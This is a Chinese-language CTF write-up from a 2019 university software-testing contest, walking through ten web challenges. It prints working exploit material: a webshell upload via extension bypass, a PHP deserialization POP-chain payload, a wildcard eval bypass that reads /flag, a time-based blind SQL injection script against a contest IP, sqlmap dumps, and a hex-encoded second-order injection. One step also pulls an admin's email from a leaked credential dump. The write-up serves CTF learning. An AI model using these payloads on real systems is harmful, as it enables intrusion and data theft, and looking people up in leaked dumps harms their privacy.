---
title: 2019 全国大学生软件测试大赛预选赛
tags:
  - Writeup
  - CTF
date: 2019-10-26 23:07:07
---

## Web1 比比手速

- 文件上传 + HTTP Header

HTTP Header 里含有 password 提交正确后可进入 upload.php, 对上传文件的后缀(.php)进行了黑名单过滤，结合 Apache 容器上传 `shell.php.xxxx` 可正常解析。

```php
/uploads/shell.php.xxxxxxx?cmd=system('ls+../');
```

获取到 flag{698539765730b69026796420b9201e03}.

## Web2 baby

- PHP 反序列化

获取到 index.php 源码：

```php
<?php  
@error_reporting(1); 
include 'flag.php';
class baby 
{   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    {      
        $this->skyobj = new sec;
    }  
    function __toString()      
    {          
        if (isset($this->skyobj))  
            return $this->skyobj->read();      
    }  
}  

class cool 
{    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()      
    {   
        $this->nice = unserialize($this->amzing);
        $this->nice->aaa = $sth;
        if($this->nice->aaa === $this->nice->bbb)
        {
            $file = "./{$this->filename}";        
            if (file_get_contents($file))         
            {              
                return file_get_contents($file); 
            }  
            else 
            { 
                return "you must be joking!"; 
            }    
        }
    }  
}  
  
class sec 
{  
    function read()     
    {          
        return "it's so sec~~";      
    }  
}  

if (isset($_GET['data']))  
{ 
    $Input_data = unserialize($_GET['data']);
    echo $Input_data; 
} 
else 
{ 
    highlight_file("./index.php"); 
} 
?>
```

容易构造出 pop chain 如下:

```php
baby::__toString()
cool::read()
file_get_contents('flag.php')
```

需要满足的条件：

1.`$this->nice->aaa === $this->nice->bbb`，设置 nice = new baby(), baby->bbb = &baby->aaa 即可。

exp:

```php
<?php
class baby {   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    public function __construct() {
        $this->skyobj = new cool();
        $this->bbb = &$this-> aaa;
    }
}  

class cool {    
    public $filename;     
    public $nice;
    public $amzing;
    public function __construct() {
        $this->filename = 'flag.php';
        $this->amzing = 'O:4:"baby":3:{s:9:" * skyobj";N;s:3:"aaa";N;s:3:"bbb";R:3;}';
    }
}
echo urlencode(serialize(new baby()));
?>
```

payload：

```php
data=O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3Bs%3A59%3A%22O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22+%2A+skyobj%22%3BN%3Bs%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A3%3B%7D%22%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D
```

获取到 flag.php 源代码如下：

```php
<?php
// $flag = 'flag{bd75a38e62ec0e450745a8eb8e667f5b}';
$sth='test5030b66d4bdtest35daed9d51e2688377299test';
```

## Web3 easy


it seems that there are some interesting func in flag.php

观察路由为 `index.php?func1`，`func1=phpinfo` 时发现执行了 phpinfo()，则 `func1` 可动态执行函数，利用 `get_disable_functions` 函数可返回所有已定义的函数数组。

![](/assets/images/move/20191101232043.png)

获得所有内置函数和已定义函数的名称，并且发现函数 `jam_source_ctf_flag`  得到源码：

```php
<?php
//include 'real_flag.php';
function jam_source_ctf_flag(){
    echo file_get_contents('flag.php');
}

class jam_flag{
        public $a;
    function __construct(){
        $this->a = isset($_GET['a'])?$_GET['a']:'123';
    }
    function gen_str($m=6){
        $str = '';
        $str_list = 'abcdefghijklmnopqrstuvwxyz';
        for($i=0;$i<$m;$i++){
            $str .= $str_list[rand(0,strlen($str_list)-1)];
        }
        return $str;
    }
    function GiveYouTheFlag(){
                include 'real_flag.php';
        $secret = $this->gen_str();
        //echo $secret;
        if($secret === $this->a){
            echo $real_flag;//echo $flag
        }
    }
    function __invoke(){
        echo 'want to use me?';
        $this->GiveYouTheFlag();
    }
}
echo rand().'<br>';
$_flag = new jam_flag;

if(isset($_POST['flag']) && $_POST['flag'] === 'I want the flag'){
        include 'real_flag.php';
    $_flag->GiveYouTheFlag();
}
?>
```

需要满足 `isset($_POST['flag']) && $_POST['flag'] === 'I want the flag'`
`$secret === $_GET['a']`，这里可以爆破 6 位随机数 a，但是机率太小了。
这里还可以利用 `get_defined_vars` 函数:

![](/assets/images/move/20191101232925.png)

此时利用思路如下:

```php
POST I want the flag -> include 'real_flag.php' -> get_defined_vars -> $flag
```

获取到 `flag{5a99aed1c516d643a297710de381bc70}`.


## Web4 注入初体验

这是一题关于 order 的注入，很简单的哦！同学们尝试下注入吧！ 

输入 `id desc`，出现降序排序，直接 sqlmap 即可一把梭哈。

```bash
sqlmap -r 'sqlmap_order_by' --dbs --level 3 --thread 9 
available databases [3]:
[*] information_schema
[*] shop
[*] test

sqlmap -r 'sqlmap_order_by' -D shop  --tables --level 3 --thread 9 
Database: shop
[2 tables]
+-------+
| flag  |
| goods |
+-------+

sqlmap -r 'sqlmap_order_by' -D shop  -T flag --columns --level 3 --thread 9 
Database: shop
Table: flag
[1 column]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| flag   | varchar(35) |
+--------+-------------+

sqlmap -r 'sqlmap_order_by' -D shop  -T flag -C flag --dump  --level 3 --thread 9 
+---------------------------+
| flag                      |
+---------------------------+
| flag{666_0rdorby_you_can} |
+---------------------------+
```


## Web5 Happy Hacking Keyboard

- Python SSTI
- Cookie forgery
- Large Integer Overflow





## Web6 easy_login

Easy Login...So Easy... 


demo 账户登录后回显 `Welcome,But u can’t do anything!`，查看 Cookie 如下：

```bash
mycookie=ZGVtb0BkYmFwcHNlY3VyaXR5LmNvbS5jbg%3D%3D
```

Base64 解码后得到 `demo@dbappsecurity.com.cn`，接下来则需要获取到 admin 的邮箱，F12 审查元素时获取到以下内容：

```html
<meta name="author" content="nwup2008">
```

社工库检索 `nwup2008` 获取到 CSDN 泄露出的 邮箱 `csdn-pass@qq.com`，base64 加密替换 Cookie 即可获取 flag{a327f27394c63ef5d6b1eed9591b90a4}.



## Web7 签到题

靶机地址：101.71.29.5:10058

```bash
$ curl -I "http://101.71.29.5:10058"
HTTP/1.1 403 Forbidden
Date: Sat, 26 Oct 2019 19:33:47 GMT
Server: Apache/2.2.15 (CentOS)
Accept-Ranges: bytes
key: Flag{c456aa77cf2bc89affb665194e9dee57}
Content-Length: 5039
Connection: close
Content-Type: text/html; charset=UTF-8
```


## Web8 bypass

- Linux 通配符

- PHP 短标签输出


```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
```

PHP 默认配置中 `short_open_tag` = ON，`<?=?>` 相当于 `<?php echo ...;?>`.

![](/assets/images/move/20191102000631.png)

- Payload

```php
?code=?><?=`/???/???%20/????`;?>
```

相当于

```php
code=?><?=` /bin/cat /flag`;?>
```

获取到 `flag{aa5237a5fc25af3fa07f1d724f7548d7}`.

## Web9 SleepCMS

- robots.txt

- get_lock()

在 robot.txt 中获取到：

```sql
INSERT INTO `article` (`id`, `title`, `view_times`,`content`) VALUES
(1, 'admin\' flag',0, 'xxxxxxxxxxxxxxxxxxxxxxx'),
(2, 'hello guest',0, 'hello guest,you want is not here~~'),
(3, 'some hint',0, 'long or short?\r\nsleep and injection!');
```
经过测试发现其检测 sleep、benchmark 函数，这里我们可以利用等价函数 `get_lock()` 来进行延时注入。

Payload:

```sql
id=1' and if(ascii(substr((content),1,1))>1,get_lock('test',3),1)%23
```

Exp:

```python
#coding=utf8
import requests
import time
data = ''
url = "http://114.55.36.69:8007/article.php?id=1'"

for i in range(47):
    for c in range(32,127):
        url_req = url + " and if(ascii(substr((content),{0},1))={1},get_lock('test',3),1)%23".format(i+1,str(c))
        print(url_req)
        start_time = time.time()
        res = requests.get(url_req)
        end_time = time.time()
        if (end_time - start_time) > 2.5:
            data += chr(c)
            print(data)
            break;
print('data:',data)
```

获取到 `flag{c221e22a28b933f103f0f88cab68b79b}`.


## Web10 这个网站没写完

- 二次注入

- Hex编码

- require_once

下载源代码 web.zip 进行审计。

- index.php

```php
<?php
    require_once("common.php");
    require_once("config.php");
    if(isset($tem)){
        require("template/$tem.php");
    }else{
        require("template/index.php");
    }

    if(isset($_POST['username'])&&$_POST['password']){
        $sql_ = "select * from users where username='$username' and password='$password'";
        $db = new sql();
        $row = $db->getone($sql_);
        if(!empty($row)){
            session_start();
            $_SESSION['username'] = $username;
            header("Location: info.php");
            exit();
        }
    }
```

`require("template/$tem.php");` 出存在任意文件包含漏洞。

- common.php

```php
<?php
	# common.php
    function waf($arr){
        foreach ($arr as $key => $value) {
            if(!is_array($value)){
                $arr[$key] = addslashes($value);
            }else{
                $arr[$key] = waf($arr[$key]);
            }
        }
        return $arr;
    }

    $_POST = waf($_POST);
    $_GET = waf($_GET);

    $role = 1;
    $table = "users";

    extract($_POST,EXTR_SKIP);
    extract($_GET,EXTR_SKIP);
```

waf 过滤了单双引号、反斜杠等特殊字符，无法正常注入。

- edit_info.php

```php
<?php
    extract($_GET);
    require_once("common.php");
    require_once("config.php");
    session_start();
    if(is_numeric($role)){
        var_dump($_SESSION);
        $username = $_SESSION['username'];
        $role = addslashes($role);
        $sql_ = "update users set role=$role where username='$username'";
        $db = new sql();
        $db->register($sql_);
    }
```

- info.php

```php
<?php
    require_once("common.php");
    require_once("config.php");
    session_start();
    $username = $_SESSION['username'];
    $sql_ = "select * from users where username='$username'";
    $db = new sql();
    $row = $db->getone($sql_);
    $username = $row['username'];
    $role = $row['role'];
    $sql_ = "select info from info where role='$role'";
    $row = $db->getone($sql_);
    $info = $row['info'];
    require("template/info.php");
```

edit_info 中存在 `extract` 变量覆盖，`$role` 可作为注入点，可利用 16 进制编码绕过 `is_numeric` 检测从而构造任意 Payload。`require_once("common.php");` 中  common.php 中的 $role 会再次覆盖掉 $role 的值，require_once 同样的文件只会包含一次，此时可利用已经包含 common.php 的 index.php 中的 `require("template/$tem.php");` 来引入 edit_info 从而解决 $role 被覆盖的问题。

思路如下：

```sql
# edit_info.php
set role =  '/**/union/**/select/**/flag/**/as/**/info/**/from/**/f1ag_233#  '
# info.php
2. select info from info where role=''/**/union/**/select/**/flag/**/as/**/info/**/from/**/f1ag_233#
```

Payload：

```php
index.php?tem=../edit_info.php&role=0x272f2a2a2f756e696f6e2f2a2a2f73656c6563742f2a2a2f666c61672f2a2a2f61732f2a2a2f696e666f2f2a2a2f66726f6d2f2a2a2f663161675f32333323
```

获得 `flag{981369acba32abc4e28103fedd4891d2}`.





